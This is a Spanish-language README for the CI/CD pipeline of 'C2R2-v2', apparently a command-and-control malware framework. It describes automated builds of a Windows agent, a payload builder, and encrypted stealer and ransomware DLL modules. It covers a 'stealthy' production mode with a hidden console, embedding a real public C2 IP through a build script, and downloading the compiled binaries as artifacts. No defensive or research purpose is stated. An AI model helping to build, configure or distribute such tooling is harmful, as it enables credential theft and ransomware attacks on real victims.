#  GitHub Actions CI/CD

Sistema de integración continua para C2R2-v2 que valida automáticamente cada commit y pull request.

##  Estado del Build

[![Build Status](../../actions/workflows/build.yml/badge.svg)](../../actions/workflows/build.yml)

##  Características

-  **Build Automático**: Compila todos los componentes en cada push
-  **Validación Multi-Modo**: Prueba compilación en desarrollo y producción
-  **Multi-Arquitectura**: Verifica x86_64 y ARM64 (Raspberry Pi)
-  **Artifacts**: Descarga binarios compilados desde GitHub
-  **Cache Management**: Limpieza automática de recursos Docker

##  Triggers

El CI/CD se ejecuta automáticamente en:

-  Push a `main` o `develop`
-  Pull Requests a `main`
-  Ejecución manual (workflow_dispatch)

##  Componentes Verificados

| Binario | x86_64 | ARM64 | Windows |
|---------|--------|-------|---------|
| c2r2-server |  |  | - |
| agent.exe | - | - |  |
| builder |  | - | - |
| stealer.dll.enc | - | - |  |
| ransomware.dll.enc | - | - |  |

##  Matriz de Build

Se ejecutan 2 builds en paralelo:

### 1. Development Build
```yaml
• Configuración: 127.0.0.1:4444
• Agente: agent-dev.exe
• Modo: Development (con debug)
• Consola: Visible
```

### 2. Production Build
```yaml
• Configuración: 127.0.0.1:4444
• Agente: agent-prod.exe
• Modo: Production (stealthy)
• Consola: Oculta
```

##  Descargar Binarios

Los binarios compilados están disponibles como artifacts en cada build:

1. Ve a [Actions](../../actions/workflows/build.yml)
2. Selecciona un workflow run exitoso ()
3. Scroll down a "Artifacts"
4. Descarga:
   - `c2r2-binaries-agent-dev-{SHA}`
   - `c2r2-binaries-agent-prod-{SHA}`

**Retención**: 7 días

##  Verificación de Build

El CI/CD valida automáticamente:

```bash
 Servidor x86_64 Linux compilado
 Servidor ARM64 Raspberry Pi compilado
 Agente Windows compilado (.exe)
 Builder herramienta compilada
 Módulos DLL encriptados generados
 BUILD_INFO.txt creado
```

##  Monitoreo

### Ver Logs en Tiempo Real

```bash
# Desde GitHub Actions UI
1. Ir a "Actions" tab
2. Seleccionar workflow run
3. Click en job " Docker Multi-Arch Build"
4. Expandir steps para ver logs
```

### Verificar Estado del Build

```bash
# Badge en README.md
[![Build](../../actions/workflows/build.yml/badge.svg)](../../actions)
```

##  Troubleshooting

### Build Fallido: "SOCKET import error"

**Causa**: Uso de `winapi::shared::ws2def::SOCKET` (deprecated)

**Solución**: Cambiar a `winapi::um::winsock2::SOCKET`

```rust
//  Incorrecto
use winapi::shared::ws2def::SOCKET;

//  Correcto
use winapi::um::winsock2::SOCKET;
```

### Build Fallido: "edition 2024 not supported"

**Causa**: Rust edition inválida en Cargo.toml

**Solución**: Usar edition = "2021"

```toml
[package]
edition = "2021"  # Soportado por Rust 1.90
```

### Docker Cache Issues

**Síntoma**: Cambios no reflejados en build

**Solución**: GitHub Actions usa `--no-cache` automáticamente

Localmente:
```bash
bash docker-build.sh --ip 127.0.0.1 --port 4444 --no-cache
```

##  Seguridad

### Binarios en Artifacts

 **Importante**: Los binarios en GitHub Artifacts contienen:
- IP servidor embebida: `127.0.0.1:4444` (localhost)
- Modo desarrollo: con símbolos de debug
- **NO usar en producción**

Para producción:
```bash
# Compilar localmente con IP real
bash docker-build.sh --ip TU_IP_PUBLICA --port 4444 --production
```

### Secrets en GitHub

No se requieren secrets para el CI/CD básico.

Para builds con configuración personalizada, agregar:
```yaml
env:
  C2_SERVER_IP: ${{ secrets.C2_SERVER_IP }}
  C2_SERVER_PORT: ${{ secrets.C2_SERVER_PORT }}
```

##  Uso del CI/CD

### 1. Desarrollo Normal

```bash
# Hacer cambios
git add .
git commit -m "feat: nueva funcionalidad"
git push origin main

# GitHub Actions automáticamente:
#  Compila todos los componentes
#  Valida binarios generados
#  Sube artifacts para descarga
```

### 2. Pull Request

```bash
git checkout -b feature/nueva-funcion
# ... hacer cambios ...
git push origin feature/nueva-funcion

# Crear PR en GitHub
# CI/CD valida el PR antes de merge
```

### 3. Ejecución Manual

```yaml
# Desde GitHub UI:
1. Ir a Actions tab
2. Seleccionar " C2R2-v2 Build & Test"
3. Click "Run workflow"
4. Seleccionar branch
5. Click "Run workflow"
```

##  Métricas

Tiempo aproximado de build:

| Stage | Tiempo |
|-------|--------|
| Setup & Checkout | ~10s |
| Docker Build (Dev) | ~120s |
| Docker Build (Prod) | ~120s |
| Extract & Verify | ~5s |
| Upload Artifacts | ~10s |
| **Total** | **~4-5 min** |

##  Configuración Avanzada

### Cambiar IP/Puerto Default

Editar `.github/workflows/build.yml`:

```yaml
env:
  DEFAULT_IP: "181.231.253.69"  # Cambiar aquí
  DEFAULT_PORT: "4444"          # Cambiar aquí
```

### Agregar Más Targets

```yaml
strategy:
  matrix:
    include:
      - name: "Development Build"
        production: "false"
      - name: "Production Build"
        production: "true"
      - name: "Custom Build"  # Nuevo
        production: "true"
        custom_flags: "--feature xyz"
```

### Notificaciones

Agregar Slack/Discord webhook:

```yaml
- name:  Notify on Success
  if: success()
  run: |
    curl -X POST ${{ secrets.SLACK_WEBHOOK }} \
      -d '{"text":" C2R2-v2 Build exitoso!"}'
```

##  Recursos

- [GitHub Actions Docs](https://docs.github.com/en/actions)
- [Docker Build Docs](https://docs.docker.com/engine/reference/commandline/build/)
- [Artifacts Guide](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts)

---

**¿Dudas sobre el CI/CD?**

Ver logs completos en: [GitHub Actions](../../actions/workflows/build.yml)
